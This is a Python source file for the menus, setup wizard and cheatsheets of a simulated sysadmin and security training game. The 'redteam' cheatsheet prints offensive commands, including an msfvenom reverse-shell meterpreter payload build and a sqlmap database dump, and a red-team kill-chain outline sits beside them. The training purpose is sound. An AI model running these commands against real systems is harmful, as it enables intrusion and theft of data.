"""
core/menu.py — SYSOPS Main Menu, New Game Wizard, Options, How To Play
Uses the v3 UI engine (pixel-perfect boxes, gradient banners, themes).
"""

import time, os, sys
from core.ui import *
from core.ui import draw_banner as _draw_banner_ui
from core.save import SaveManager, LEVEL_TITLES, level_for_xp, XP_PER_LEVEL, DIFF_NAMES


def _header(save: SaveManager = None):
    """Clear screen, draw gradient banner, thin rule."""
    clear()
    print(_draw_banner_ui())
    hr_accent()
    print()


# ══════════════════════════════════════════════════════════════════════════════
# MAIN MENU
# ══════════════════════════════════════════════════════════════════════════════

def main_menu(save: SaveManager) -> str:
    """
    Returns: 'load' | 'new' | 'options' | 'howto' | 'exit'
    """
    _header()

    has_save = save.exists()
    th = get_theme()

    if has_save:
        save.load()
        d      = save.data
        lvl    = level_for_xp(d.get("xp", 0))
        title  = LEVEL_TITLES[min(lvl, len(LEVEL_TITLES)-1)]
        xp     = d.get("xp", 0)
        diff   = DIFF_NAMES.get(d.get("difficulty",2),"?")
        done   = len(d.get("completed_scenarios",[]))
        hrs    = d.get("playtime_seconds",0) // 3600
        mins   = (d.get("playtime_seconds",0) % 3600) // 60

        bc     = th["banner_cols"]
        col    = fg256(bc[0]) if bc else BYELLOW

        # Save info card
        lines = [
            f"{col}{B}{d.get('username','?')}@{d.get('hostname','?')}{R}",
            f"Level {col}{B}{lvl}{R} — {BWHITE}{title}{R}   {DIM}XP: {xp:,}{R}",
            f"Missions {ok(str(done))}   Difficulty {warn(diff)}   {DIM}{hrs}h {mins}m played{R}",
        ]
        box("Save Data", lines, width=56, style="round",
            border_color=th["box_border"])
        print()

    # Menu items
    items = []
    if has_save:
        items.append(("1", "CONTINUE",    "resume your session",          BGREEN))
    items.append(    ("2" if has_save else "1", "NEW GAME",
                      "start fresh — choose theme & font",                 BCYAN))
    if has_save:
        items.append(("3", "OPTIONS",     "theme · font · difficulty · focus", DIM))
    items.append((str(len(items)+1), "HOW TO PLAY", "quick reference guide",    BYELLOW))
    items.append((str(len(items)+1), "EXIT",         "",                         BRED))

    for key, label, desc, col in items:
        desc_s = f"  {DIM}{desc}{R}" if desc else ""
        print(f"  {th['accent']}{B}[{key}]{R}  {col}{B}{label}{R}{desc_s}")

    print()

    while True:
        try:
            raw = input(f"  {th['accent']}▶{R} ").strip()
        except (EOFError, KeyboardInterrupt):
            return "exit"

        low = raw.lower()

        # Map text shortcuts
        if low in ("c","continue"):    return "load"
        if low in ("n","new"):         return "new"
        if low in ("o","options","s","settings"): return "options"
        if low in ("h","help","how","?"): return "howto"
        if low in ("q","quit","exit","x","e"): return "exit"

        try:
            n = int(raw)
            if has_save:
                mapping = {1:"load", 2:"new", 3:"options",
                           4:"howto", 5:"exit"}
            else:
                mapping = {1:"new", 2:"howto", 3:"exit"}
            r = mapping.get(n)
            if r:
                return r
        except ValueError:
            pass

        print(warn(f"  Enter a number or shortcut key"))


# ══════════════════════════════════════════════════════════════════════════════
# NEW GAME WIZARD
# ══════════════════════════════════════════════════════════════════════════════

def new_game_wizard(save: SaveManager):
    """Full new-game setup flow."""

    # ── Step 1: Theme ──────────────────────────────────────────────────────
    _header()
    section("STEP 1 OF 5 — COLOUR THEME")
    chosen_theme = theme_picker()
    set_theme(chosen_theme)

    # ── Step 2: Font ───────────────────────────────────────────────────────
    chosen_font = font_picker()
    set_font(chosen_font)

    # ── Step 3: Identity ───────────────────────────────────────────────────
    _header()
    th = get_theme()
    section("STEP 3 OF 5 — IDENTITY")
    print(f"  {DIM}This appears in your terminal prompt and save file.{R}\n")

    print(f"  {BWHITE}{B}Username{R}  {DIM}(default: user){R}")
    username = input(f"  {th['accent']}>{R} ").strip() or "user"

    print(f"\n  {BWHITE}{B}Server hostname{R}  {DIM}(default: server){R}")
    hostname = input(f"  {th['accent']}>{R} ").strip() or "server"

    print(f"\n  {BWHITE}{B}Prompt style:{R}")
    print(f"  {th['accent']}{B}[1]{R}  {BGREEN}{username}{R}{DIM}@{R}{BCYAN}{hostname}{R}  "
          f"{DIM}user@host  (classic){R}")
    print(f"  {th['accent']}{B}[2]{R}  {BCYAN}{hostname}{R}{DIM}@{R}{BGREEN}{username}{R}  "
          f"{DIM}host@user{R}")
    print(f"  {th['accent']}{B}[3]{R}  Custom string")
    ps_raw = input(f"  {th['accent']}>{R} ").strip()
    custom_prompt = ""
    if ps_raw == "2":
        prompt_style = "host@user"
    elif ps_raw == "3":
        prompt_style = "custom"
        custom_prompt = input(f"  {th['accent']}custom prompt>{R} ").strip() or f"{username}@{hostname}"
    else:
        prompt_style = "user@host"

    # ── Step 4: Difficulty ─────────────────────────────────────────────────
    _header()
    section("STEP 4 OF 5 — DIFFICULTY")

    diffs = [
        (1, "EASY",      BGREEN,   "All modules unlocked. Hints always visible."),
        (2, "MEDIUM",    BYELLOW,  "Progressive unlocks. Hints available. Recommended."),
        (3, "HARD",      BRED,     "No hints after step 1. Earn your unlocks."),
        (4, "NIGHTMARE", fg256(196),"Zero hints. Wrong flags have consequences. Brutal."),
    ]
    for n, name, col, desc in diffs:
        print(f"  {th['accent']}{B}[{n}]{R}  {col}{B}{name:<12}{R}  {DIM}{desc}{R}")
    print()
    d_raw = input(f"  {th['accent']}>{R} ").strip()
    try:
        difficulty = max(1, min(4, int(d_raw)))
    except ValueError:
        difficulty = 2

    # ── Hints preference (tied to difficulty) ─────────────────────────────
    print()
    if difficulty == 1:
        hints_enabled = True
        print(f"  {ok('✓')} Hints are {ok('always ON')} in Easy mode.")
        pause(0.5)
    elif difficulty == 4:
        hints_enabled = False
        print(f"  {warn('!')} Nightmare mode — hints are {err('permanently OFF')}.")
        pause(0.5)
    else:
        diff_name = "Medium" if difficulty == 2 else "Hard"
        print(f"  {DIM}{diff_name} mode selected.{R}  Enable hints during missions?")
        print(f"  {th['accent']}{B}[1]{R}  {BGREEN}Yes{R}   {DIM}show command hints below each step{R}")
        print(f"  {th['accent']}{B}[2]{R}  {BRED}No{R}    {DIM}no hints — work it out yourself{R}")
        h_raw = input(f"  {th['accent']}>{R} ").strip()
        hints_enabled = h_raw != "2"
        print(f"  {ok('✓')} Hints {'enabled' if hints_enabled else 'disabled'}.")
        pause(0.4)

    # ── Step 5: Focus module ───────────────────────────────────────────────
    _header()
    section("STEP 5 OF 5 — FOCUS MODULE")
    print(f"  {DIM}What do you want to master first?{R}\n")

    modules = [
        ("rsync",      "File transfers — large files, partial resume, speed tuning"),
        ("tailscale",  "Mesh networking — peers, relay vs direct, netcheck"),
        ("docker",     "Containers — run, compose, build, network, volume"),
        ("nginx",      "Web server — reverse proxy, SSL, security headers"),
        ("networking", "Fundamentals — netstat, ss, ip, dig, curl, traceroute"),
        ("cybersec",   "Security — nmap, tshark, gobuster, nikto, hydra, lynis"),
        ("git",        "Version control — full git workflow, rebase, bisect"),
        ("redteam",    "Red team — recon, msfconsole, linpeas, sqlmap, report"),
        ("defense",    "Blue team — logs, SIEM triage, IOCs, incident response"),
        ("combo",      "Everything — full-stack workflow missions"),
    ]
    for i, (mod, desc) in enumerate(modules, 1):
        print(f"  {th['accent']}{B}[{i}]{R}  {th['cmd']}{B}{mod:<12}{R}  {DIM}{desc}{R}")
    print()
    m_raw = input(f"  {th['accent']}>{R} ").strip()
    try:
        focus_module = modules[int(m_raw)-1][0]
    except (ValueError, IndexError):
        focus_module = "rsync"

    # ── Create save ────────────────────────────────────────────────────────
    save.new_game(username, hostname, prompt_style, difficulty)
    save.data["prompt_custom"]  = custom_prompt
    save.data["focus_module"]   = focus_module
    save.data["color_theme"]    = chosen_theme
    save.data["banner_font"]    = chosen_font
    save.data["hints_enabled"]  = hints_enabled
    save.save()

    # ── Confirmation screen ────────────────────────────────────────────────
    _header()
    diff_name = DIFF_NAMES[difficulty]
    diff_col  = {1:BGREEN,2:BYELLOW,3:BRED,4:fg256(196)}[difficulty]

    lines = [
        f"Username    {cyan(username)}",
        f"Hostname    {cyan(hostname)}",
        f"Prompt      {warn(save.prompt_str()+':~$')}",
        f"Difficulty  {diff_col}{B}{diff_name}{R}",
        f"Focus       {th['cmd']}{B}{focus_module}{R}",
        f"Theme       {th['accent']}{B}{THEMES[chosen_theme]['name']}{R}",
        f"Font        {DIM}{chosen_font}{R}",
    ]
    box("Profile Created", lines, width=50, style="heavy",
        border_color=th["box_border"])
    print()
    print(dim("  Press Enter to begin…"))
    try:
        input()
    except (EOFError, KeyboardInterrupt):
        pass


# ══════════════════════════════════════════════════════════════════════════════
# OPTIONS SCREEN
# ══════════════════════════════════════════════════════════════════════════════

def options_screen(save: SaveManager):
    while True:
        _header()
        th   = get_theme()
        d    = save.data
        diff_name = DIFF_NAMES.get(d.get("difficulty",2),"?")
        hints_val = ok("ON") if d.get("hints_enabled",True) else err("OFF")
        focus     = d.get("focus_module","rsync") or "rsync"
        cur_theme = d.get("color_theme","cyberpunk")
        cur_font  = d.get("banner_font","block")
        cur_speed = d.get("anim_speed","cinematic")

        section("OPTIONS & SETTINGS")

        opts = [
            ("1", "Colour Theme",    f"{th['accent']}{B}{THEMES.get(cur_theme,{}).get('name','?')}{R}"),
            ("2", "Banner Font",     f"{DIM}{cur_font}{R}"),
            ("3", "Animation Speed", f"{th['cmd']}{B}{cur_speed}{R}"),
            ("4", "Difficulty",      f"{warn(diff_name)}"),
            ("5", "Hints",           hints_val),
            ("6", "Focus Module",    f"{th['cmd']}{B}{focus}{R}"),
            ("7", "Combo Guide",     dim("combined workflow reference")),
            ("8", "Username/Host",   dim(f"{d.get('username')}@{d.get('hostname')}")),
            ("9", "Achievements",    dim(f"{len(d.get('achievements',[]))} earned")),
            ("d", "Delete Save",     err("⚠ permanent")),
            ("0", "Back",            ""),
        ]
        for key, label, val in opts:
            print(f"  {th['accent']}{B}[{key}]{R}  {BWHITE}{label:<18}{R}  {val}")

        print()
        raw = input(f"  {th['accent']}▶{R} ").strip().lower()

        if raw in ("0","b","back","q"):
            break

        elif raw == "1":
            chosen = theme_picker()
            d["color_theme"] = chosen
            set_theme(chosen)

        elif raw == "2":
            chosen = font_picker()
            d["banner_font"] = chosen
            set_font(chosen)

        elif raw == "3":
            chosen = speed_picker()
            d["anim_speed"] = chosen
            set_speed(chosen)

        elif raw == "4":
            _header()
            section("DIFFICULTY")
            for n, name, col, desc in [
                (1,"Easy",BGREEN,"All unlocked, hints always"),
                (2,"Medium",BYELLOW,"Recommended"),
                (3,"Hard",BRED,"No hints"),
                (4,"Nightmare",fg256(196),"Brutal"),
            ]:
                print(f"  {th['accent']}{B}[{n}]{R}  {col}{B}{name:<10}{R}  {DIM}{desc}{R}")
            r2 = input(f"  {th['accent']}>{R} ").strip()
            try:
                d["difficulty"]    = max(1,min(4,int(r2)))
                d["hints_enabled"] = d["difficulty"] <= 2
                print(ok(f"  ✓ Difficulty updated"))
                pause(0.6)
            except ValueError:
                pass

        elif raw == "5":
            difficulty = d.get("difficulty", 2)
            if difficulty == 1:
                print(info("  Hints are always ON in Easy mode — cannot be disabled."))
            elif difficulty == 4:
                print(info("  Hints are always OFF in Nightmare mode — cannot be enabled."))
            else:
                d["hints_enabled"] = not d.get("hints_enabled", True)
                print(ok(f"  Hints: {'ON' if d['hints_enabled'] else 'OFF'}"))
            pause(0.5)

        elif raw == "6":
            _choose_focus(save)

        elif raw == "7":
            _combo_guide()
            input(dim("\n  Press Enter to continue…"))

        elif raw == "8":
            print()
            nu = input(f"  New username [{d['username']}]: ").strip() or d["username"]
            nh = input(f"  New hostname [{d['hostname']}]: ").strip() or d["hostname"]
            d["username"] = nu
            d["hostname"] = nh
            print(ok(f"  ✓ {nu}@{nh}"))
            pause(0.5)

        elif raw == "9":
            _show_achievements(save)
            input(dim("\n  Press Enter…"))

        elif raw in ("d","delete"):
            confirm = input(warn("  Type DELETE to confirm: ")).strip()
            if confirm == "DELETE":
                save.delete()
                print(ok("  Save deleted."))
                pause(1)
                break

        save.save()


# ── Internal helpers ──────────────────────────────────────────────────────────

def _choose_focus(save: SaveManager):
    _header()
    th = get_theme()
    section("FOCUS MODULE")
    modules = [
        ("rsync",      "File transfers — rsync, partial resume, large files"),
        ("tailscale",  "Mesh networking — peers, relay vs direct, netcheck"),
        ("docker",     "Containers — run, compose, build, network, volume"),
        ("nginx",      "Web server — reverse proxy, SSL, security headers"),
        ("networking", "Networking — netstat, ss, ip, dig, curl, traceroute"),
        ("cybersec",   "Security — nmap, tshark, gobuster, nikto, hydra, lynis"),
        ("git",        "Version control — init, branch, rebase, stash, bisect"),
        ("redteam",    "Red team — recon, msfconsole, linpeas, sqlmap, report"),
        ("defense",    "Blue team — logs, SIEM triage, IOCs, incident response"),
        ("combo",      "All combined — full-stack missions"),
        ("ssh",        "SSH — keygen, copy-id, sessions"),
    ]
    for i, (mod, desc) in enumerate(modules, 1):
        print(f"  {th['accent']}{B}[{i}]{R}  {th['cmd']}{B}{mod:<14}{R}  {DIM}{desc}{R}")
    print()
    raw = input(f"  {th['accent']}>{R} ").strip()
    try:
        mod = modules[int(raw)-1][0]
        save.data["focus_module"] = mod
        print(ok(f"  ✓ Focus: {mod}"))
        _show_module_commands(mod, th)
        pause(0.8)
    except (ValueError, IndexError):
        pass


def _show_module_commands(mod, th):
    cheatsheets = {
        "rsync":      ["rsync -avh --progress <src> user@host:<dst>",
                       "rsync -avh --progress --partial --inplace --no-compress <big> user@host:<dst>",
                       'rsync -avh -e "ssh -T -c aes128-gcm@openssh.com -o Compression=no" <src> <dst>'],
        "tailscale":  ["tailscale up","tailscale status","tailscale ping <host>",
                       "tailscale netcheck","tailscale ip"],
        "docker":     ["docker run -d --name n -p 8080:80 nginx",
                       "docker compose up -d / down","docker logs -f <name>",
                       "docker exec -it <name> sh","docker system prune"],
        "nginx":      ["nginx config create <site>","nginx config enable <site>",
                       "nginx config ssl <domain>","nginx test && nginx reload"],
        "networking": ["ss -tulnp","ip addr / ip route",
                       "dig <domain> A/MX/TXT","traceroute <host>","curl -v https://<host>"],
        "cybersec":   ["nmap -sV -O <target>","nmap -A --script vuln <target>",
                       "tshark -i eth0 -c 50 -w capture.pcap",
                       "gobuster dir -u http://<host> -w wordlist.txt","lynis audit system"],
        "git":        ["git init && git add . && git commit -m 'msg'",
                       "git checkout -b feature/x","git rebase -i HEAD~3",
                       "git stash push -m 'WIP' && git stash pop",
                       "git push --force-with-lease origin main"],
        "redteam":    ["theHarvester -d <domain> -b all",
                       "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=x LPORT=4444 -f elf -o shell.elf",
                       "msfconsole","linpeas","sqlmap -u 'http://host/?id=1' --dbs --dump",
                       "report engagement.md"],
        "defense":    ["journalctl -u sshd -n 30",
                       "grep \"Failed password\" /var/log/auth.log",
                       "siem dashboard / siem alerts",
                       "siem investigate 1 / siem escalate 1",
                       "ioc add <attacker-ip> / ioc export",
                       "incident contain <ip> / incident report"],
    }
    cmds = cheatsheets.get(mod, [])
    if cmds:
        print()
        print(dim(f"  Key {mod} commands:"))
        for c in cmds:
            print(f"    {DIM}${R} {th['cmd']}{c}{R}")


def _combo_guide():
    """Show combo missions reference with tools, workflows, and prereqs."""
    from scenarios.missions import SCENARIOS

    clear()
    th = get_theme()
    section("COMBO MISSIONS — Multi-Tool Workflows")

    print(f"  {DIM}Combo missions chain multiple tools in a single challenge.{R}")
    print(f"  {DIM}Complete the listed prerequisite missions first.{R}\n")

    COMBO_DETAILS = {
        "combo01": {
            "tools":    ["tailscale", "docker", "nginx", "rsync"],
            "workflow": ["Connect tailnet", "Deploy compose stack",
                         "Configure reverse proxy", "rsync 3GB archive"],
            "prereqs":  ["ts01", "dk01", "dk02", "nx01"],
        },
        "combo02": {
            "tools":    ["tailscale", "docker", "cybersec"],
            "workflow": ["Deploy lab container", "nmap + gobuster + nikto",
                         "Capture traffic (tshark)", "Harden with UFW + lynis"],
            "prereqs":  ["dk01", "cy01", "cy02", "cy03"],
        },
        "git05": {
            "tools":    ["git", "docker"],
            "workflow": ["Commit Dockerfile", "Build image with git hash tag",
                         "Run & verify container", "Tag the release"],
            "prereqs":  ["git01", "dk01", "dk03"],
        },
        "rt06": {
            "tools":    ["all red-team phases"],
            "workflow": ["Recon (theHarvester/amass)",
                         "Weaponize (msfvenom)", "Exploit (msfconsole)",
                         "Post-exploit (linpeas/hashdump)", "Report"],
            "prereqs":  ["rt01", "rt02", "rt03", "rt04", "rt05"],
        },
    }

    combo_scs = [sc for sc in SCENARIOS
                 if "combo" in sc["category"].lower()
                 or "COMBO" in sc.get("tags", [])]

    diff_colors = {1: BGREEN, 2: BYELLOW, 3: BRED, 4: fg256(196)}
    diff_names  = {1: "EASY", 2: "MEDIUM", 3: "HARD", 4: "NIGHTMARE"}

    for sc in combo_scs:
        d       = sc["difficulty"]
        details = COMBO_DETAILS.get(sc["id"], {})
        tools   = details.get("tools", [])
        wf      = details.get("workflow", [])
        prereqs = details.get("prereqs", [])

        print(f"  {th['accent']}{B}[{sc['id']}]{R}  "
              f"{BWHITE}{B}{sc['title']}{R}  "
              f"{diff_colors.get(d, BRED)}{diff_names.get(d,'?')}{R}  "
              f"{dim('+'+str(sc['xp_reward'])+' XP')}")
        print(f"       {DIM}{sc['category']}{R}")

        if tools:
            tool_str = " + ".join(f"{th['cmd']}{t}{R}" for t in tools)
            print(f"       Tools    : {tool_str}")

        if wf:
            wf_str = f" {DIM}→{R} ".join(f"{DIM}{s}{R}" for s in wf[:4])
            print(f"       Workflow : {wf_str}")

        if prereqs:
            pre_str = " · ".join(f"{th['cmd']}{p}{R}" for p in prereqs)
            print(f"       Prereqs  : {pre_str}")

        print()

    print(dim("  Start any combo mission from the game: mission <id>"))
    print(dim("  e.g.  mission combo01   or   mission rt06"))
    print()


def _show_achievements(save: SaveManager):
    achs = save.data.get("achievements", [])
    th   = get_theme()
    section("ACHIEVEMENTS")
    if not achs:
        print(dim("  No achievements yet — keep training!"))
        return
    for a in achs:
        ts = time.strftime("%Y-%m-%d", time.localtime(a.get("ts", 0)))
        col = fg256(th["banner_cols"][0]) if th["banner_cols"] else BYELLOW
        print(f"  {col}{B}🏆 {a['name']}{R}  {DIM}{ts}{R}")
        print(f"     {DIM}{a['desc']}{R}")
        print()


# ══════════════════════════════════════════════════════════════════════════════
# HOW TO PLAY
# ══════════════════════════════════════════════════════════════════════════════

def howto_screen():
    _header()
    th = get_theme()
    ac = th["accent"]
    cc = th["cmd"]

    rows = [
        ("THE TERMINAL",
         "Type commands exactly as you would in real Linux. Nothing is executed for real."),
        ("NAVIGATION",
         "↑/↓ recall command history · Tab auto-completes commands, mission IDs & paths · cd/ls/pwd move around the filesystem."),
        ("MISSIONS",
         "Guided challenges. Run 'missions' to list all. Run 'mission <id>' to start."),
        ("QUICK CHALLENGES",
         "Single-command drills. Run 'challenge' for a random question."),
        ("XP & LEVELS",
         "Every command earns XP. Missions give bonus XP. 10 levels total."),
        ("THEMES",
         "Change colour palette in Options → [1] or type 'theme' at any prompt."),
        ("FONTS",
         "Change the ASCII banner in Options → [2] or type 'font' at any prompt."),
    ]

    lines = []
    for title, desc in rows:
        lines.append(f"{ac}{B}{title}{R}")
        lines.append(f"  {DIM}{desc}{R}")
        lines.append("")

    lines += [
        f"{ac}{B}KEY COMMANDS{R}",
        f"  {cc}help{R}              all commands",
        f"  {cc}help <module>{R}     module cheatsheet  (git · docker · rsync · redteam…)",
        f"  {cc}missions{R}          list missions",
        f"  {cc}mission <id>{R}      start a mission",
        f"  {cc}challenge{R}         quick drill",
        f"  {cc}status{R}            active mission progress",
        f"  {cc}xp{R}                your XP, level, stats",
        f"  {cc}theme{R}             change colour palette live",
        f"  {cc}font{R}              change banner font live",
        f"  {cc}killchain{R}         red team phase tracker",
        f"  {cc}save{R}              save progress manually",
        f"  {cc}quit{R}              exit (auto-saves)",
    ]

    box("How To Play", lines, width=72, style="round",
        border_color=th["box_border"])
    print()
    input(dim("  Press Enter to continue…"))
